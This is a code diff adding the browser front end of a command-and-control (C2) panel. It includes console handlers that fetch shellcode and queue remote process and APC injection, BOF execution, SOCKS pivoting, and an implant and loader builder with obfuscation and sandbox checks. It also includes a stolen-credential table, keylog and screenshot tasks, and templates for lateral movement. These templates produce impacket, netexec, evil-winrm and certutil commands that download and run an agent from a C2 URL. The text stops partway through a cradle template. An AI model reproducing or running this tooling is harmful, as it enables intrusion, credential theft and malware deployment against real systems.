+      if (!parts4[0]) { addConsoleOutput('usage: forkrun <shellcode.bin> [process]', '', null); return; }
+      addConsoleOutput(`[*] Fetching ${parts4[0]} from server…`, '', null);
+      try {
+        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(parts4[0])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${parts4[0]}: ${fr.statusText}`, null); return; }
+        const sc = new Uint8Array(await fr.arrayBuffer());
+        payload = btoa(String.fromCharCode(...sc));
+        taskType = 'FORK_RUN';
+        taskArgs = parts4.slice(1).join(' ');
+      } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
+      break;
+    }
+    case 'inject-apc': {
+      const parts5 = args.split(' ');
+      if (!parts5[0]) { addConsoleOutput('usage: inject-apc <shellcode.bin> [process]', '', null); return; }
+      try {
+        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(parts5[0])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${parts5[0]}: ${fr.statusText}`, null); return; }
+        const sc = new Uint8Array(await fr.arrayBuffer());
+        payload = btoa(String.fromCharCode(...sc));
+        taskType = 'INJECT_APC';
+        taskArgs = parts5.slice(1).join(' ');
+      } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
+      break;
+    }
+    case 'inject': {
+      // inject <pid> <shellcode.bin>
+      const parts6 = args.split(' ');
+      if (parts6.length < 2) { addConsoleOutput('usage: inject <pid> <shellcode.bin>', '', null); return; }
+      const pid = parts6[0];
+      try {
+        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(parts6[1])}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${parts6[1]}: ${fr.statusText}`, null); return; }
+        const sc = new Uint8Array(await fr.arrayBuffer());
+        payload = btoa(String.fromCharCode(...sc));
+        taskType = 'INJECT_REMOTE';
+        taskArgs = pid;
+      } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
+      break;
+    }
+    case 'stage2': {
+      // stage2 <shellcode.bin>
+      if (!args) { addConsoleOutput('usage: stage2 <shellcode.bin>', '', null); return; }
+      try {
+        const fr = await fetch(`${BASE}/dl/${encodeURIComponent(args)}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+        if (!fr.ok) { addConsoleOutput('', `Cannot fetch ${args}: ${fr.statusText}`, null); return; }
+        const sc = new Uint8Array(await fr.arrayBuffer());
+        payload = btoa(String.fromCharCode(...sc));
+        taskType = 'STAGE2';
+        taskArgs = '';
+      } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
+      break;
+    }
+    case 'upload': {
+      // upload <local_filename_on_server> <remote_path>
+      const uparts = args.split(' ');
+      if (uparts.length < 2) { addConsoleOutput('usage: upload <server_filename> <remote_path>', '', null); return; }
+      taskType = 'UPLOAD';
+      taskArgs = JSON.stringify({filename: uparts[0], remote_path: uparts.slice(1).join(' ')});
+      break;
+    }
+    case 'bof': {
+      const bofSub = args.trim().split(/\s+/)[0] || '';
+      // bof / bof list — show available BOFs
+      if (!bofSub || bofSub === 'list') {
+        try {
+          const br = await fetch(`${BASE}/bofs`, {headers:{'Authorization':'Bearer '+TOKEN}});
+          const bd = await br.json();
+          if (!bd.ok) { addConsoleOutput('', bd.error || 'error', null); return; }
+          if (!bd.total) {
+            addConsoleOutput('[!] No BOFs installed. Run: bof install', '', null);
+          } else {
+            let out = '';
+            for (const repo of (bd.repos||[])) {
+              out += `\n── ${repo.name} (${repo.bofs.length})\n`;
+              for (const b of repo.bofs) out += `  ${b.name.padEnd(35)} ${b.path}\n`;
+            }
+            out += `\ntotal: ${bd.total} BOFs`;
+            addConsoleOutput(out, '', null);
+          }
+        } catch(e) { addConsoleOutput('', 'fetch error: '+e.message, null); }
+        return;
+      }
+      // bof install — clone/update BOF collections
+      if (bofSub === 'install') {
+        addConsoleOutput('[*] Installing BOF collections (may take a minute)…', '', null);
+        try {
+          const ir = await fetch(`${BASE}/bofs?action=install`, {method:'POST', headers:{'Authorization':'Bearer '+TOKEN}});
+          const id = await ir.json();
+          if (id.lines) for (const l of id.lines) addConsoleOutput(l, '', null);
+          addConsoleOutput(`[+] Done — ${id.total} BOFs available`, '', null);
+        } catch(e) { addConsoleOutput('', 'install error: '+e.message, null); }
+        return;
+      }
+      // bof <name> [args] — resolve and execute
+      const bofName = bofSub;
+      const bofArgStr = args.trim().slice(bofName.length).trim();
+      try {
+        const rr = await fetch(`${BASE}/bofs`, {
+          method:'POST',
+          headers:{'Authorization':'Bearer '+TOKEN,'Content-Type':'application/json'},
+          body: JSON.stringify({name: bofName, args: bofArgStr})
+        });
+        const rd = await rr.json();
+        if (!rd.ok) { addConsoleOutput('', `bof error: ${rd.error}`, null); return; }
+        addConsoleOutput(`[*] BOF ${rd.name} (${atob(rd.payload).length} bytes)`, '', null);
+        taskType = 'BOF';
+        payload  = rd.payload;
+        taskArgs = rd.args;
+      } catch(e) { addConsoleOutput('', 'resolve error: '+e.message, null); return; }
+      break;
+    }
+    case 'rsocks': {
+      const [sub5,...r5] = args.split(' ');
+      taskType = sub5==='start' ? 'RSOCKS_START' : 'RSOCKS_STOP';
+      taskArgs = r5.join(' ');
+      break;
+    }
+    case 'link': {
+      const [sub6,...r6] = args.split(' ');
+      taskType = sub6==='start' ? 'PIPE_START' : 'PIPE_STOP';
+      taskArgs = r6.join(' ');
+      break;
+    }
+    case 'httpivot': {
+      taskType = args.startsWith('stop') ? 'HTTP_PIVOT_STOP' : 'HTTP_PIVOT_START';
+      taskArgs = args.replace(/^start\s*/,'').replace(/^stop\s*/,'');
+      break;
+    }
+    default:
+      addConsoleOutput(`Unknown command: ${cmd}. Type 'help' for usage.`, '', null);
+      return;
+  }
+
+  try {
+    const r = await api('POST', `/gui/api/agents/${agentID}/task`, {type:taskType, args:taskArgs, payload});
+    if (!r.ok) { addConsoleOutput('', r.error || 'Error queueing task', null); return; }
+    const tid = r.data?.task_id;
+    if (tid) pollResult(tid, agentID);
+  } catch(e) {
+    addConsoleOutput('', 'Network error: ' + e.message, null);
+  }
+}
+
+let pollTimers = {};
+async function pollResult(taskID, agentID) {
+  const aid = agentID || activeAgent?.id;
+  if (!aid) return;
+  const key = `${aid}-${taskID}`;
+  if (pollTimers[key]) return;
+  pollTimers[key] = true;
+  for (let i = 0; i < 60; i++) {
+    await sleep(2000);
+    try {
+      const r = await api('GET', `/gui/api/agents/${aid}/results/${taskID}`);
+      if (r.ok && r.data) {
+        addConsoleOutput(r.data.output||'', r.data.error||'', r.data.created_at);
+        delete pollTimers[key];
+        return;
+      }
+    } catch(e) {}
+  }
+  delete pollTimers[key];
+}
+
+function toggleAll(chk) {
+  document.querySelectorAll('.agent-chk').forEach(c => c.checked = chk.checked);
+}
+
+async function killAgent(id) {
+  if (!confirm('Kill agent ' + id.substring(0,8) + '?')) return;
+  await api('POST', `/gui/api/agents/${id}/task`, {type:'KILL', args:''});
+  toast('Kill command sent', 'red');
+  setTimeout(refreshAgents, 2000);
+}
+
+// ── Listeners ─────────────────────────────────────────────────────────────────
+async function refreshListeners() {
+  try {
+    const r = await api('GET', '/gui/api/jobs');
+    if (!r.ok) return;
+    listeners = r.data || [];
+    renderListeners();
+  } catch(e) {}
+}
+
+function renderListeners() {
+  const tbody = document.getElementById('listeners-tbody');
+  document.getElementById('listener-count').textContent = `${listeners.length} listener${listeners.length!==1?'s':''}`;
+  tbody.innerHTML = listeners.map(j => `
+    <tr>
+      <td class="mono">#${j.id}</td>
+      <td>${esc(j.protocol||'')}</td>
+      <td class="mono">:${j.port}</td>
+      <td><span class="dot ${j.status==='running'?'dot-green':'dot-red'}"></span>${j.status}</td>
+      <td style="color:var(--text3)">${relTime(j.started_at)}</td>
+      <td><button class="btn btn-danger btn-sm" onclick="stopListener(${j.id})">Stop</button></td>
+    </tr>`).join('') || `<tr><td colspan="6" style="text-align:center;color:var(--text3);padding:30px">No listeners</td></tr>`;
+}
+
+function listenerProtoChange() {
+  const proto = document.getElementById('lst-proto').value;
+  document.getElementById('lst-domain-row').style.display = proto === 'dns' ? '' : 'none';
+  document.getElementById('lst-port').value = {http:'8080',mtls:'8443',wstunnel:'40000',dns:'53'}[proto] || '8080';
+}
+
+async function startListener() {
+  const proto = document.getElementById('lst-proto').value;
+  const port = parseInt(document.getElementById('lst-port').value);
+  const domain = document.getElementById('lst-domain').value.trim();
+  const body = {proto, port};
+  if (domain) body.domain = domain;
+  const r = await api('POST', '/gui/api/jobs', body);
+  if (r.ok) {
+    toast('Listener started on :' + port, 'green');
+    closeModal('modal-listener');
+    refreshListeners();
+  } else {
+    toast('Error: ' + (r.error || 'unknown'), 'red');
+  }
+}
+
+async function stopListener(id) {
+  if (!confirm('Stop listener #' + id + '?')) return;
+  const r = await api('DELETE', `/gui/api/jobs/${id}`);
+  if (r.ok) { toast('Listener stopped', 'yellow'); refreshListeners(); }
+  else toast('Error: ' + (r.error || 'unknown'), 'red');
+}
+
+// ── Payloads ───────────────────────────────────────────────────────────────────
+// ── Agent Builder sub-tabs ────────────────────────────────────────────────────
+function setAgentTab(tab) {
+  document.getElementById('ag-implant').style.display  = tab === 'implant'  ? '' : 'none';
+  document.getElementById('ag-delivery').style.display = tab === 'delivery' ? '' : 'none';
+  document.getElementById('agtab-implant').classList.toggle('active',  tab === 'implant');
+  document.getElementById('agtab-delivery').classList.toggle('active', tab === 'delivery');
+}
+
+// ── OPSEC highlight helpers ───────────────────────────────────────────────────
+function opsecCheck(selectEl, badgeId, hintId) {
+  const opt = selectEl.options[selectEl.selectedIndex];
+  const isOpsec = opt && opt.dataset.opsec === 'true';
+  selectEl.classList.toggle('opsec-active', isOpsec);
+  if (badgeId) document.getElementById(badgeId)?.classList.toggle('show', isOpsec);
+  if (hintId)  document.getElementById(hintId)?.classList.toggle('show', isOpsec);
+}
+
+function opsecCheckbox(cbEl, labelId, badgeId) {
+  const label = labelId && document.getElementById(labelId);
+  const badge = badgeId && document.getElementById(badgeId);
+  if (label) label.classList.toggle('opsec-on', cbEl.checked);
+  if (badge) badge.classList.toggle('show', cbEl.checked);
+  cbEl.parentElement.classList.toggle('opsec-active', cbEl.checked);
+}
+
+// ── Format change (Implant sub-tab) ──────────────────────────────────────────
+function payFormatChange() {
+  const fmt = document.getElementById('pay-format').value;
+  const NO_ENCRYPT = ['linux', 'dll', 'html'];
+  document.getElementById('pay-encrypt-row').style.display = NO_ENCRYPT.includes(fmt) ? 'none' : '';
+  // OPSEC badge on format select
+  const opt = document.getElementById('pay-format').options[document.getElementById('pay-format').selectedIndex];
+  const fmtBadge = document.getElementById('pay-format-badge');
+  if (fmtBadge) fmtBadge.classList.toggle('show', !!(opt && opt.dataset.opsec));
+}
+
+// ── Build Agent (Implant or Delivery) ────────────────────────────────────────
+async function buildPayload() {
+  const isDelivery = document.getElementById('agtab-delivery').classList.contains('active');
+  let fmt, body;
+
+  if (isDelivery) {
+    fmt = document.getElementById('pay-deliv-format').value;
+    body = {
+      format: fmt,
+      server_url: 'http://' + document.getElementById('pay-host').value + ':' + document.getElementById('pay-port').value,
+      transport: document.getElementById('pay-transport').value,
+      sleep_sec: parseInt(document.getElementById('pay-sleep').value)||60,
+      jitter_pct: parseInt(document.getElementById('pay-jitter').value)||20,
+      stage_url: document.getElementById('pay-deliv-stage').value,
+      garble: document.getElementById('pay-deliv-garble').checked,
+    };
+  } else {
+    fmt = document.getElementById('pay-format').value;
+    body = {
+      format: fmt,
+      server_url: 'http://' + document.getElementById('pay-host').value + ':' + document.getElementById('pay-port').value,
+      transport: document.getElementById('pay-transport').value,
+      sleep_sec: parseInt(document.getElementById('pay-sleep').value)||60,
+      jitter_pct: parseInt(document.getElementById('pay-jitter').value)||20,
+      encrypt: document.getElementById('pay-encrypt').value || undefined,
+      garble: document.getElementById('pay-garble').checked,
+      sandbox_checks: document.getElementById('pay-sandbox').checked,
+    };
+  }
+
+  const res = document.getElementById('pay-result');
+  res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Building…</div>';
+  const r = await api('POST', '/gui/api/build', body);
+  if (r.ok) {
+    res.innerHTML = `<div class="result-card">${esc(JSON.stringify(r.data, null, 2))}</div>`;
+    toast('Payload built!', 'green');
+  } else {
+    res.innerHTML = `<div class="result-card" style="color:var(--red)">${esc(r.error||'Unknown error')}</div>`;
+  }
+}
+
+// ── Build Loader ──────────────────────────────────────────────────────────────
+async function buildLoader() {
+  const stageURL = document.getElementById('ldr-stage-url').value.trim();
+  if (!stageURL) { toast('Stage URL requerida', 'red'); return; }
+
+  const loaderFmt  = document.getElementById('ldr-type').value;
+  const encode     = document.getElementById('ldr-encode').value;
+  const garble     = document.getElementById('ldr-garble').checked;
+
+  const body = {
+    format:    loaderFmt,
+    stage_url: stageURL,
+    encrypt:   encode || undefined,
+    garble:    garble,
+    // required by API even for loaders
+    server_url: 'http://127.0.0.1:8080',
+    transport:  'http',
+    sleep_sec:  60,
+    jitter_pct: 20,
+  };
+
+  const res = document.getElementById('ldr-result');
+  res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Building…</div>';
+  const r = await api('POST', '/gui/api/build', body);
+  if (r.ok) {
+    res.innerHTML = `<div class="result-card">${esc(JSON.stringify(r.data, null, 2))}</div>`;
+    toast('Loader built!', 'green');
+  } else {
+    res.innerHTML = `<div class="result-card" style="color:var(--red)">${esc(r.error||'Unknown error')}</div>`;
+  }
+}
+
+function setPETool(tab) {
+  document.getElementById('petool-exec').style.display  = tab === 'exec'  ? '' : 'none';
+  document.getElementById('petool-donut').style.display = tab === 'donut' ? '' : 'none';
+  document.getElementById('petab-exec').classList.toggle('active',  tab === 'exec');
+  document.getElementById('petab-donut').classList.toggle('active', tab === 'donut');
+}
+
+function asmFileSelected(inp) {
+  document.getElementById('asm-label').textContent = inp.files[0]?.name || 'Click or drop .NET EXE here';
+}
+function donutFileSelected(inp) {
+  document.getElementById('donut-label').textContent = inp.files[0]?.name || 'Click or drop file here';
+}
+
+async function execAsm() {
+  const file = document.getElementById('asm-file').files[0];
+  const agentID = document.getElementById('asm-agent').value;
+  const proc = document.getElementById('asm-proc').value.trim();
+  if (!file) { toast('Select a file first', 'red'); return; }
+  if (!agentID) { toast('Select an agent', 'red'); return; }
+  const res = document.getElementById('asm-result');
+  res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Converting to shellcode…</div>';
+  const data = await file.arrayBuffer();
+  const r = await api('POST', '/gui/api/donut', data, true);
+  if (!r.ok) { res.innerHTML = `<div class="result-card" style="color:var(--red)">Donut error: ${r.statusText}</div>`; return; }
+  const scBytes = new Uint8Array(await r.arrayBuffer());
+  const b64 = btoa(String.fromCharCode(...scBytes));
+  const tr = await api('POST', `/gui/api/agents/${agentID}/task`, {type:'INJECT_APC', args:proc, payload:b64});
+  if (tr.ok) {
+    res.innerHTML = `<div class="result-card">Shellcode (${scBytes.length} bytes) queued for APC injection (task #${tr.data?.task_id})</div>`;
+    toast('Execute-assembly queued!', 'green');
+  } else {
+    res.innerHTML = `<div class="result-card" style="color:var(--red)">Task error: ${tr.error||'unknown'}</div>`;
+  }
+}
+
+async function donutConvert() {
+  const file = document.getElementById('donut-file').files[0];
+  if (!file) { toast('Select a file first', 'red'); return; }
+  const res = document.getElementById('donut-result');
+  res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Converting…</div>';
+  const data = await file.arrayBuffer();
+  const r = await api('POST', '/gui/api/donut', data, true);
+  if (!r.ok) { res.innerHTML = `<div class="result-card" style="color:var(--red)">Error: ${r.statusText}</div>`; return; }
+  const bytes = new Uint8Array(await r.arrayBuffer());
+  const blob = new Blob([bytes]);
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = file.name.replace(/\.[^.]+$/,'')+'.bin';
+  a.click(); URL.revokeObjectURL(url);
+  res.innerHTML = `<div class="result-card">✓ Converted: ${bytes.length} bytes shellcode — downloaded as .bin</div>`;
+}
+
+// ── Credentials ────────────────────────────────────────────────────────────────
+async function loadCreds() {
+  try {
+    const r = await api('GET', '/gui/api/creds');
+    if (r.ok) { creds = r.data || []; renderCreds(); }
+  } catch(e) {}
+}
+
+function renderCreds() {
+  const filter = document.getElementById('cred-filter').value.toLowerCase();
+  const tbody = document.getElementById('creds-tbody');
+  const filtered = creds.filter(c =>
+    !filter || [c.domain,c.username,c.host,c.source,c.type].some(f => f?.toLowerCase().includes(filter))
+  );
+  tbody.innerHTML = filtered.map(c => `<tr>
+    <td><span style="color:var(--accent);font-size:10px;text-transform:uppercase">${esc(c.type||'')}</span></td>
+    <td class="mono">${esc(c.domain||'')}</td>
+    <td class="mono">${esc(c.username||'')}</td>
+    <td class="mono" style="max-width:140px;overflow:hidden;text-overflow:ellipsis">${esc(c.secret||'')}</td>
+    <td class="mono">${esc(c.host||'')}</td>
+    <td style="color:var(--text3)">${esc(c.source||'')}</td>
+    <td><button class="btn btn-danger btn-sm" onclick="delCred(${c.id})">Del</button></td>
+  </tr>`).join('') || `<tr><td colspan="7" style="text-align:center;color:var(--text3);padding:20px">No credentials</td></tr>`;
+}
+
+async function addCred() {
+  const body = {
+    type: document.getElementById('cred-type').value,
+    domain: document.getElementById('cred-domain').value,
+    username: document.getElementById('cred-user').value,
+    secret: document.getElementById('cred-secret').value,
+    host: document.getElementById('cred-host').value,
+    source: document.getElementById('cred-source').value,
+  };
+  if (!body.username || !body.secret) { toast('Username and secret required', 'red'); return; }
+  const r = await api('POST', '/gui/api/creds', body);
+  if (r.ok) { toast('Credential added', 'green'); closeModal('modal-add-cred'); loadCreds(); }
+  else toast('Error: ' + r.error, 'red');
+}
+
+async function delCred(id) {
+  if (!confirm('Delete credential #' + id + '?')) return;
+  const r = await api('DELETE', `/gui/api/creds/${id}`);
+  if (r.ok) { toast('Credential deleted', 'yellow'); loadCreds(); }
+  else toast('Error: ' + r.error, 'red');
+}
+
+// ── Downloads ──────────────────────────────────────────────────────────────────
+async function loadDownloads() {
+  try {
+    const r = await api('GET', '/gui/api/uploads');
+    if (r.ok) { downloads = r.data || []; renderDownloads(); }
+  } catch(e) {}
+}
+
+function renderDownloads() {
+  const tbody = document.getElementById('downloads-tbody');
+  tbody.innerHTML = (downloads||[]).map(f => `<tr>
+    <td class="mono">${esc(f.filename)}</td>
+    <td class="mono">${humanSize(f.size)}</td>
+    <td style="color:var(--text3)">${relTime(f.created_at)}</td>
+    <td><a class="btn btn-ghost btn-sm" href="${BASE}/dl/${encodeURIComponent(f.filename)}?token=${TOKEN}" download="${esc(f.filename)}">⬇ Download</a></td>
+  </tr>`).join('') || `<tr><td colspan="4" style="text-align:center;color:var(--text3);padding:20px">No files</td></tr>`;
+}
+
+// ── Keylog loot ────────────────────────────────────────────────────────────────
+async function dumpKeylog() {
+  const agentID = document.getElementById('keylog-agent').value;
+  if (!agentID) { toast('Select an agent', 'red'); return; }
+  const r = await api('POST', `/gui/api/agents/${agentID}/task`, {type:'KEYLOG_DUMP', args:''});
+  if (r.ok) {
+    document.getElementById('keylog-output').textContent = 'Waiting for result…';
+    const tid = r.data?.task_id;
+    for (let i = 0; i < 30; i++) {
+      await sleep(1500);
+      const res = await api('GET', `/gui/api/agents/${agentID}/results/${tid}`);
+      if (res.ok && res.data) {
+        document.getElementById('keylog-output').textContent = res.data.output || '(empty)';
+        return;
+      }
+    }
+  } else toast('Error: ' + r.error, 'red');
+}
+
+// ── Screenshot ─────────────────────────────────────────────────────────────────
+async function takeScreenshot() {
+  const agentID = document.getElementById('ss-agent').value;
+  if (!agentID) { toast('Select an agent', 'red'); return; }
+  const r = await api('POST', `/gui/api/agents/${agentID}/task`, {type:'SCREENSHOT', args:''});
+  if (r.ok) { toast('Screenshot task queued', 'green'); setTimeout(loadDownloads, 5000); }
+  else toast('Error: ' + r.error, 'red');
+}
+
+// ── Reports ────────────────────────────────────────────────────────────────────
+async function loadReportStats() {
+  try {
+    const r = await api('GET', '/gui/api/report');
+    if (!r.ok) return;
+    const d = r.data || {};
+    const grid = document.getElementById('stat-grid');
+    grid.innerHTML = `
+      <div class="stat-card"><div class="stat-num">${d.active_agents||0}</div><div class="stat-label">Active Agents</div></div>
+      <div class="stat-card"><div class="stat-num">${d.total_agents||0}</div><div class="stat-label">Total Sessions</div></div>
+      <div class="stat-card"><div class="stat-num">${d.total_tasks||0}</div><div class="stat-label">Tasks Run</div></div>
+      <div class="stat-card"><div class="stat-num">${d.total_creds||0}</div><div class="stat-label">Credentials</div></div>
+    `;
+    const act = document.getElementById('report-activity');
+    if (d.recent_agents && d.recent_agents.length) {
+      act.innerHTML = '<table style="width:100%"><thead><tr><th>Agent</th><th>Host</th><th>User</th><th>OS</th><th>Last Seen</th></tr></thead><tbody>' +
+        d.recent_agents.map(a => `<tr><td class="mono">${a.id?.substring(0,8)}</td><td>${esc(a.hostname||'')}</td><td>${esc(a.username||'')}</td><td>${esc(a.os||'')}</td><td>${relTime(a.last_seen)}</td></tr>`).join('') +
+        '</tbody></table>';
+    } else {
+      act.textContent = 'No recent activity.';
+    }
+  } catch(e) {}
+}
+
+async function generateReport() {
+  const r = await api('GET', '/gui/api/report');
+  if (r.ok) {
+    const blob = new Blob([JSON.stringify(r.data, null, 2)], {type:'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = `c2_report_${new Date().toISOString().substring(0,10)}.json`;
+    a.click(); URL.revokeObjectURL(url);
+    toast('Report downloaded', 'green');
+  }
+}
+
+// ── Chat ────────────────────────────────────────────────────────────────────────
+async function loadChat() {
+  try {
+    const r = await api('GET', `/gui/api/chat?since=${lastChatID}`);
+    if (!r.ok || !r.data) return;
+    const msgs = r.data || [];
+    msgs.forEach(m => {
+      if (m.id > lastChatID) lastChatID = m.id;
+      appendChatMsg(m);
+    });
+  } catch(e) {}
+}
+
+function appendChatMsg(m) {
+  const el = document.getElementById('chat-messages');
+  const div = document.createElement('div');
+  div.className = 'chat-msg';
+  div.innerHTML = `<span class="chat-sender">${esc(m.sender||m.operator||'?')}</span><span class="chat-ts">${fmtTime(m.ts||m.created_at)}</span><br><span class="chat-text">${esc(m.message||m.text||'')}</span>`;
+  el.appendChild(div);
+  el.scrollTop = el.scrollHeight;
+}
+
+async function sendChat() {
+  const inp = document.getElementById('chat-input');
+  const msg = inp.value.trim();
+  if (!msg) return;
+  inp.value = '';
+  const r = await api('POST', '/gui/api/chat', {message: msg, sender: OPERATOR});
+  if (!r.ok) toast('Chat error: ' + r.error, 'red');
+}
+
+function chatKey(e) {
+  if (e.key === 'Enter') sendChat();
+}
+
+function isChatVisible() {
+  return document.getElementById('tab-chat').classList.contains('active');
+}
+
+// ── Logs ───────────────────────────────────────────────────────────────────────
+function addLog(ev) {
+  logEntries.push(ev);
+  if (logEntries.length > 1000) logEntries.shift();
+  renderLogs();
+}
+
+function renderLogs() {
+  const filter = document.getElementById('log-filter').value;
+  const filtered = filter ? logEntries.filter(e => e.type === filter) : logEntries;
+  const list = document.getElementById('log-list');
+  const autoscroll = document.getElementById('log-autoscroll').checked;
+  list.innerHTML = filtered.slice(-200).map(ev => `
+    <div class="log-entry log-${ev.type||'LOG'}">
+      <span class="log-ts">${fmtTime(new Date().toISOString())}</span>
+      <span class="log-type">${ev.type||'LOG'}</span>
+      <span class="log-msg">${ev.agent_id?`[${ev.agent_id.substring(0,8)}] `:''}${esc(ev.msg||'')}</span>
+    </div>`).join('');
+  if (autoscroll) list.scrollTop = list.scrollHeight;
+}
+
+function filterLogs() { renderLogs(); }
+
+// ── Modals ──────────────────────────────────────────────────────────────────────
+function openModal(id) { document.getElementById(id).classList.add('open'); }
+function closeModal(id) { document.getElementById(id).classList.remove('open'); }
+
+// ── Badges ──────────────────────────────────────────────────────────────────────
+function updateBadge(name) {
+  const badge = document.getElementById('badge-' + name);
+  if (badge) badge.style.display = '';
+}
+function clearBadge(name) {
+  const badge = document.getElementById('badge-' + name);
+  if (badge) badge.style.display = 'none';
+}
+
+// ── Toast ───────────────────────────────────────────────────────────────────────
+function toast(msg, color='green') {
+  const icons = {green:'✅', red:'❌', yellow:'⚠️'};
+  const container = document.getElementById('toast-container');
+  const div = document.createElement('div');
+  div.className = 'toast';
+  div.innerHTML = `<span class="toast-icon">${icons[color]||'ℹ️'}</span><span class="toast-msg">${esc(msg)}</span><button class="toast-close btn" onclick="this.parentElement.remove()">✕</button>`;
+  div.style.borderColor = {green:'var(--green)',red:'var(--red)',yellow:'var(--yellow)'}[color]||'var(--border2)';
+  container.appendChild(div);
+  setTimeout(() => div.remove(), 5000);
+}
+
+// ── Helpers ─────────────────────────────────────────────────────────────────────
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+function relTime(ts) {
+  if (!ts) return '—';
+  const d = typeof ts === 'string' ? new Date(ts) : new Date(ts * 1000);
+  const sec = Math.floor((Date.now() - d.getTime()) / 1000);
+  if (sec < 60) return sec + 's ago';
+  if (sec < 3600) return Math.floor(sec/60) + 'm ago';
+  if (sec < 86400) return Math.floor(sec/3600) + 'h ago';
+  return Math.floor(sec/86400) + 'd ago';
+}
+function fmtTime(ts) {
+  if (!ts) return '';
+  return new Date(ts).toLocaleTimeString();
+}
+function humanSize(bytes) {
+  if (!bytes) return '0 B';
+  const k = 1024;
+  const sizes = ['B','KB','MB','GB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return (bytes / Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
+}
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function updateAgentSelects() {
+  ['asm-agent','keylog-agent','ss-agent'].forEach(id => {
+    const sel = document.getElementById(id);
+    if (!sel) return;
+    const cur = sel.value;
+    sel.innerHTML = '<option value="">— select agent —</option>' +
+      agents.filter(a => agentStatus(a).color !== 'red').map(a =>
+        `<option value="${a.id}" ${a.id===cur?'selected':''}>${a.id.substring(0,8)} (${a.hostname})</option>`
+      ).join('');
+  });
+}
+
+// ── Stager cradles ──────────────────────────────────────────────────────────
+function stagerUpdate() {
+  const target = document.getElementById('st-target').value.trim() || '<TARGET>';
+  const domain = document.getElementById('st-domain').value.trim();
+  const user   = document.getElementById('st-user').value.trim()   || '<USER>';
+  const pass   = document.getElementById('st-pass').value.trim();
+  const hash   = document.getElementById('st-hash').value.trim();
+  const lbin   = document.getElementById('st-lbin').value.trim()   || '/opt/c2/bin/agent.exe';
+  const rpath  = document.getElementById('st-rpath').value.trim()  || 'C:\\Windows\\Temp\\svc.exe';
+  const surl   = document.getElementById('st-surl').value.trim()   || 'http://<C2>:8080/agent.exe';
+  const kaliip = document.getElementById('st-kaliip').value.trim() || '<KALI_IP>';
+  const useHash = hash.length > 0;
+
+  const domPfx   = domain ? domain + '/' : '';
+  const passOrPh = pass || '<PASS>';
+  const impAuth  = useHash
+    ? `${domPfx}${user}@${target} -hashes :${hash}`
+    : `${domPfx}${user}:'${passOrPh}'@${target}`;
+
+  const nxeDom  = domain ? ` -d ${domain}` : '';
+  const nxeAuth = useHash
+    ? `-u ${user} -H ${hash}${nxeDom}`
+    : `-u ${user} -p '${passOrPh}'${nxeDom}`;
+
+  // Convert Windows path C:\Windows\Temp\svc.exe → \Windows\Temp\svc.exe (for C$ share)
+  const rUnc   = rpath.replace(/^[A-Za-z]:/, '');
+  const rName  = rpath.split('\\').pop() || 'agent.exe';
+  const shareDir = '/tmp/c2share';
+
+  const cradles = {
+    'smb-upload':
+`# Subir binario al share C$ del target
+impacket-smbclient ${impAuth} \\
+  -c 'use C$; put ${lbin} ${rUnc}'`,
+
+    'smb-wmi':
+`# 1. Subir via SMB
+impacket-smbclient ${impAuth} \\
+  -c 'use C$; put ${lbin} ${rUnc}'
+
+# 2. Ejecutar via WMIexec
+impacket-wmiexec ${impAuth} '${rpath}'`,
+
+    'smb-atexec':
+`# 1. Subir via SMB
+impacket-smbclient ${impAuth} \\
+  -c 'use C$; put ${lbin} ${rUnc}'
+
+# 2. Ejecutar via Scheduled Task
+impacket-atexec ${impAuth} '${rpath}'`,
+
+    'smb-dcom':
+`# 1. Subir via SMB
+impacket-smbclient ${impAuth} \\
+  -c 'use C$; put ${lbin} ${rUnc}'
+
+# 2. Ejecutar via DCOM (MMC20.Application)
+impacket-dcomexec ${impAuth} '${rpath}'`,
+
+    'psexec':
+`# PSexec gestiona la subida internamente (usa ADMIN$)
+# Nota: muy detectado — solo en labs o entornos sin EDR
+impacket-psexec ${impAuth} cmd.exe`,
+
+    'smbexec':
+`# Shell remota vía SMB (no sube binario propio)
+# Usa comandos del sistema para ejecutar
+impacket-smbexec ${impAuth}`,
+
+    'nxe-upload':
+`# 1. Subir binario via SMB
+netexec smb ${target} ${nxeAuth} \\
+  --put-file ${lbin} '${rpath}'
+
+# 2. Ejecutar
+netexec smb ${target} ${nxeAuth} \\
+  -x '${rpath}'`,
+
+    'evilwinrm':
+`# Sesión interactiva WinRM (puerto 5985)
+${useHash ? `evil-winrm -i ${target} -u ${user} -H ${hash}${domain ? ' -d '+domain : ''}` : `evil-winrm -i ${target} -u ${user} -p '${passOrPh}'${domain ? ' -d '+domain : ''}`}
+
+# Dentro de la sesión evil-winrm:
+# upload ${lbin}
+# .\\${rName}`,
+
+    'certutil':
+`# Descarga con certutil + exec via WMIexec
+impacket-wmiexec ${impAuth} \\
+  'cmd.exe /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}'`,
+
+    'bitsadmin':
+`# Descarga con bitsadmin + exec via WMIexec
+impacket-wmiexec ${impAuth} \\
